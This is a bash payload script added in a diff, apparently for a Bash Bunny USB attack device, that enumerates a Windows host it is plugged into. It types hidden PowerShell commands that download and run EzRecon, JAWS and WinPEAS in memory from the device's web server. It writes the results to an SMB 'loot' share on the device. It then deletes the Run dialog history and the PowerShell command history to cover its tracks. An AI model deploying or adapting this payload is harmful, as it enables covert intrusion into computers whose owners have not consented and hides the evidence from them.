@@ -1,0 +1,130 @@
+#!/bin/bash
+#############################################################################
+# Title:                                                                    #
+#     bogs binny (host enumeration)                --:-::..                 #       
+#                                                    -:-   =-:.             #                                
+# Author:                                              +*-  '=**:           #                
+#     irrrwin                                           =+*   '+ =.         #                
+#                                                        -*.    +==.        #                    
+# Description:                                           ++-.    +--        #                    
+#     Starts http server to                               *-+-   +-+:       #                                
+#     server scripts and an                               --==   ==:=.      #                                
+#     SMB server for loot.                               .:+-*==-:+--=.     #                                
+#     Launches 3 attacks:                     .--=-===+*#=- --  -=+*:--     #                                
+#     1) Run EzRecon                        :==::-======-          -- *:    #                                
+#     2) Run JAWS                         :+-:==    -+-               -#:   #                                
+#     3) Run WinPeas.exe                 -=-=     - +           -      +-   #                                
+#                                       .+-+    =+ *+*         =#+     +:   #                                
+# Usage:                               .===    = =                     +:   #                                
+#     0. Set to Switch 2.              :++   -*+=+*= =-. --=---       =-    #                                
+#     1. Plug in.                     .=+ ,=--..--:+==+. +...:==-     +     #                                
+#     2. ...                          :+ =-.       :-:-:    ....=+   -=     #                                
+#     3. Profit.                     .+ +=         :-:-:          +  --     #                                
+#                                   :+ ='=                        =- =:     #                                
+#                                  .+-= .--      :--:           :==  --     #                    
+#                                 =*=.   ..::-:--.  .::::-==---=--    +     #                    
+#                                 *=.                      .=         +.    #                                
+#                                                          .==-      -=-    #                        
+#                                                            :+      ::+    #                        
+# Disclaimer:                                                               #
+#     *This program is free software: you can redistribute it and/or modify #
+#     it under the terms of the GNU General Public License as published by  #
+#     the Free Software Foundation, either version 3 of the License, or (at #
+#     your option) any later version.*                                      #
+#                                                                           #
+#     *You should have received a copy of the GNU General Public License    #
+#     along with this program. If not, see http://www.gnu.org/licenses/ *   #
+#                                                                           #
+#############################################################################
+
+
+# >>> SETTINGS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+# ~~~~~~~~~~~~ EDIT BELOW ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STAGE1="EzRecon.ps1"
+STAGE2="JAWS.ps1"
+STAGE3="WinPeas.exe"
+# ~~~~~~~~~~~~ EDIT ABOVE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< SETTINGS <<<
+
+
+# >>> SETUP >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID
+
+GET HOST_IP
+GET SWITCH_POSITION
+GET TARGET_HOSTNAME
+GET TARGET_IP
+
+# GET HOSTNAME
+[[ -z "${TARGET_HOSTNAME}" ]] && TARGET_HOSTNAME="noname"
+
+# Set directories
+PAYLOAD_DIR="/root/udisk/payloads/${SWITCH_POSITION}"
+LOOT_DIR="/root/udisk/loot/${SWITCH_POSITION}"
+LOOT_SHARE="\\\\${HOST_IP}\\s"
+mkdir -p "${LOOT_DIR}"
+COUNT=$(ls -lad ${LOOT_DIR}/${TARGET_HOSTNAME}* | wc -l)
+COUNT=$((COUNT+1))
+SCAN_DIR="${LOOT_DIR}/${TARGET_HOSTNAME}-${COUNT}"
+mkdir -p "${SCAN_DIR}"
+
+cd "$PAYLOAD_DIR/src"
+
+# Start web server
+LOG_HTTP="${PAYLOAD_DIR}/http.log"
+touch "${LOG_HTTP}"
+gohttp -p 80 > "${LOG_HTTP}" &
+
+# Start SMB server
+LOG_SMB="${PAYLOAD_DIR}/smb.log"
+touch "${LOG_SMB}"
+python /tools/impacket/examples/smbserver.py s "${SCAN_DIR}" -smb2support > "${LOG_SMB}" &
+
+Q $_JITTER_ENABLED = TRUE
+Q $_JITTER_MAX = 42
+
+Q DELAY 100
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< SETUP <<<
+
+
+# >>> STAGE 1 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+# Run EzRecon
+LED STAGE1
+Q DELAY 500
+RUN WIN "powershell -w h -c \"iex(New-Object net.webclient).DownloadString('http://${HOST_IP}/${STAGE1}')|Out-File '${LOOT_SHARE}\\${STAGE1}.txt';if(\$?){ni -ItemType File -Path '${LOOT_SHARE}\\_1'};exit\""
+Q DELAY 100
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< STAGE 1 <<<
+
+
+# >>> STAGE 2 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+# Run JAWS
+LED STAGE2
+Q DELAY 500
+RUN WIN "powershell -w h -c \"iex(New-Object net.webclient).DownloadString('http://${HOST_IP}/${STAGE2}')|Out-File '${LOOT_SHARE}\\${STAGE2}.txt';if(\$?){ni -ItemType File -Path '${LOOT_SHARE}\\_2'};exit\""
+Q DELAY 100
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< STAGE 2 <<<
+
+
+# >>> STAGE 3 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+# Run WinPEAS
+LED STAGE3
+Q DELAY 500
+RUN WIN "powershell -w h -c \"[Reflection.Assembly]::Load([byte[]](iwr 'http://${HOST_IP}/${STAGE3}' -UseBasicParsing|% C*));[winPEAS.Program]::Main('log=${LOOT_SHARE}\\${STAGE3}.txt');ni -ItemType File -Path '${LOOT_SHARE}\\_3';exit\""
+Q DELAY 100
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< STAGE 3 <<<
+
+
+# >>> LOOT >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+LED SPECIAL
+while ! [ -f "$SCAN_DIR/_1" -a -f "$SCAN_DIR/_2" -a -f "$SCAN_DIR/_3" ]; do sleep 1; done
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< LOOT <<<
+
+
+# >>> CLEANUP >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+LED CLEANUP
+rm "$SCAN_DIR"/_*
+RUN WIN "powershell -w h -c \"reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f; Remove-Item (Get-PSreadlineOption).HistorySavePath\""
+sync
+LED FINISH
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< CLEANUP <<<
